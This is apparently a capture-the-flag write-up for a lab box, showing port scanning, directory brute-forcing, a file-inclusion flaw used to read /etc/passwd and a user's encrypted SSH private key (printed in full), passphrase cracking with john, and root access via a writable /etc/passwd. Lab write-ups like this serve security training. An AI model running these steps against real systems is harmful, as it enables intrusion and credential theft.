## CTF 02
> Capture The Flag.
> 
> IP: 192.168.10.15
> 
> The flag is stored in the flag.txt file.

> Capture The Flag.
> 
> IP: 192.168.10.15
> 
> The flag is stored in the root.txt file.

### Nmap
To gather first information, a port scan is executed. It shows two running services, SSH and a webserver.

```bash
$ nmap -sV -Pn -p- -A 192.168.10.15
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 06:08 EDT
Nmap scan report for 192.168.10.15
Host is up (0.0060s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 44:95:50:0b:e4:73:a1:85:11:ca:10:ec:1c:cb:d4:26 (RSA)
|   256 27:db:6a:c7:3a:9c:5a:0e:47:ba:8d:81:eb:d6:d6:3c (ECDSA)
|_  256 e3:07:56:a9:25:63:d4:ce:39:01:c1:9a:d9:fe:de:64 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.79 seconds
```

For more information on the webserver, gobuster is used.

```bash
$ gobuster dir -u http://192.168.10.15 -w /usr/share/wordlists/dirb/common.txt    
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.15
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/15 15:59:51 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10701]
/robots.txt           (Status: 200) [Size: 12]   
/secret               (Status: 301) [Size: 315] [--> http://192.168.10.15/secret/]
/server-status        (Status: 403) [Size: 278]                                   

===============================================================
2022/06/15 16:00:03 Finished
===============================================================

$ curl http://192.168.10.15/robots.txt
Hello H4x0r

$ gobuster dir -u http://192.168.10.15/secret/ -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.15/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/06/15 16:00:27 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 4]  
                                               
===============================================================
2022/06/15 16:00:36 Finished
===============================================================

$ curl http://192.168.10.15/secret/





$ curl http://192.168.10.15/secret/ -I
HTTP/1.1 200 OK
Date: Wed, 15 Jun 2022 14:00:47 GMT
Server: Apache/2.4.38 (Debian)
Last-Modified: Mon, 16 Aug 2021 10:04:22 GMT
ETag: "4-5c9aa534cd120"
Accept-Ranges: bytes
Content-Length: 4
Content-Type: text/html
```

Since the results are not helpfull another, more extensive, gobuster search in the `/secret` folder is done.


```bash
 gobuster dir -u http://192.168.10.15/secret/
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
    -x '.php,.html,.txt' 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.10.15/secret/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2022/06/15 18:56:26 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4]
/evil.php             (Status: 200) [Size: 0]
                                             
===============================================================
2022/06/15 19:08:57 Finished
===============================================================

```

### File inclusion
After a few tries, we figured out that a GET parameter `?cmd=` can be used, to request files on the web server. From the `/etc/passwd` we know, that there is a user called `mowree`, so we try to get their private SSH key.

```bash                                                              
$ curl http://192.168.10.15/secret/evil.php?command=/etc/passwd
root:$1$nap$AgFBO.1Zzzrs5kAK5lVea/:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
mowree:x:1000:1000:mowree,,,:/home/mowree:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin

$ curl http://192.168.10.15/secret/evil.php?command=/home/mowree/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E

uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6
hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe
o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb
+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot
b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k
HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg
9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY
zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu
rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1
tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs
94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm
VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7
Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P
hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr
Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR
IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R
MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS
62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69
Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8
p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C
pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X
KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa
i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp
4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/
8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==
-----END RSA PRIVATE KEY-----
```

The private key is encrypted with a password, so `john` is used to crack the password.

```bash
$ wget https://raw.githubusercontent.com/openwall/john/bleeding-jumbo/run/ssh2john.py

$ python ssh2john.py id_rsa > id_rsa.hash

$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
unicorn          (id_rsa)     
1g 0:00:00:00 DONE (2022-06-15 19:20) 33.33g/s 42666p/s 42666c/s 42666C/s ramona..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

With the password `unicorn` we can now decrypt the private key and connect via SSH.

```bash
$ ssh mowree@192.168.10.15 -i id_rsa                                    
Enter passphrase for key 'id_rsa': unicorn
Linux EvilBoxOne 4.19.0-17-amd64 #1 SMP Debian 4.19.194-3 (2021-07-18) x86_64
mowree@EvilBoxOne:~$ ls -lah
total 32K
drwxr-xr-x 4 mowree mowree 4,0K may 15 17:12 .
drwxr-xr-x 3 root   root   4,0K ago 16  2021 ..
lrwxrwxrwx 1 root   root      9 ago 16  2021 .bash_history -> /dev/null
-rwxr-xr-x 1 mowree mowree  220 ago 16  2021 .bash_logout
-rwxr-xr-x 1 mowree mowree 3,5K ago 16  2021 .bashrc
drwxr-xr-x 3 mowree mowree 4,0K ago 16  2021 .local
-rwxr-xr-x 1 mowree mowree  807 ago 16  2021 .profile
drwxr-xr-x 2 mowree mowree 4,0K ago 16  2021 .ssh
-r-------- 1 mowree mowree   44 may 15 17:12 user.txt

mowree@EvilBoxOne:~$ cat user.txt
cyberctfd{WdnyIjucRPQY8fanmdvbklZpWVxZq1eJ}
```

### Privilege escalation
Running [linpeas](https://github.com/carlospolop/PEASS-ng) shows that the `/etc/passwd` file is writeable, which means that we can change the password for root.


```bash
mowree@EvilBoxOne:~$ openssl passwd -1 -salt salty test123
$1$salty$k/iwHaKT6IqLxlAauLSyH0

mowree@EvilBoxOne:~$ nano /etc/passwd
mowree@EvilBoxOne:~$ su -
Contraseña: test123

root@EvilBoxOne:~# cat /root/root.txt 
cyberctfd{t2dj9ONj6pB9uY7BBBsvayCGyXzsvwUF}

```